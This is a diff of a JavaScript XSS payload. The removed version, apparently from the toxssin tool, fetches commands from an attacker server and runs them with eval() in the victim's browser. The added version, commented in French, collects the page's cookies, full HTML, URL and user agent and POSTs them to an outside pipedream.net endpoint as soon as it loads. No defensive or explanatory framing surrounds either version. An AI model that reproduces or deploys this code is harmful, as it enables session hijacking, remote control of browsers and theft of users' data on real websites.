@@ -1,46 +1,39 @@
-function establish() {
-        let cookie = document.cookie;
-        let toxssin_id, state;
-        let index = cookie.indexOf("TOXSESSIONID");
-        if (index >= 0) {
-                toxssin_id = cookie.substring(index+13, index+45);
-                state = 'found';
+// Fonction pour récupérer les cookies
+function grabCookies() {
+    return document.cookie;
+}
 
-        } else {
-                toxssin_id = uuid().replaceAll('-', '');
-                state = 'init';
-                setCookie(*COOKIE_AGE*, toxssin_id);
-        }
-        return [toxssin_id, state];
-};
+// Fonction pour récupérer tout le HTML de la page
+function grabFullHTML() {
+    return document.documentElement.outerHTML;
+}
 
+// Fonction pour envoyer les données au serveur
+function sendDataToServer() {
+    const cookies = grabCookies();
+    const html = grabFullHTML();
+    
+    // Créer l'objet de données à envoyer
+    const data = {
+        cookies: cookies,
+        html: html,
+        url: window.location.href,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+    };
+    
+    // Envoyer les données via une requête POST
+    fetch('https://eocjrr7wg4x5n7n.m.pipedream.net', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    }).catch(error => {
+        console.error('Erreur lors de l\'envoi des données:', error);
+    });
+}
 
-function setCookie(expDays, value) {
-        if (document.cookie.includes("TOXSESSIONID") === false) {
-        let date = new Date();
-        date.setTime(date.getTime() + (expDays * 24 * 60 * 60 * 1000));
-        const expires = "expires=" + date.toUTCString();
-        document.cookie = `TOXSESSIONID=${value}; ${expires}; samesite=None; secure; domain=${document.domain}`; 
-    } 
-};
-
-
-function uuid() {
-  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
-    return v.toString(16);
-  });
-};
-
-
-session_data = establish();
-tox_req = new XMLHttpRequest();
-tox_req.open("GET", `*TOXSSIN_SERVER*/c1cbfe271a40788a00e8bf8574d94d4b/${session_data[0]}/${session_data[1]}`, true);
-
-tox_req.onreadystatechange = function() {
-        if (this.readyState == 4) {
-                eval(this.responseText);
-        }
-};
-
-tox_req.send();
+// Exécuter la fonction d'envoi
+sendDataToServer();
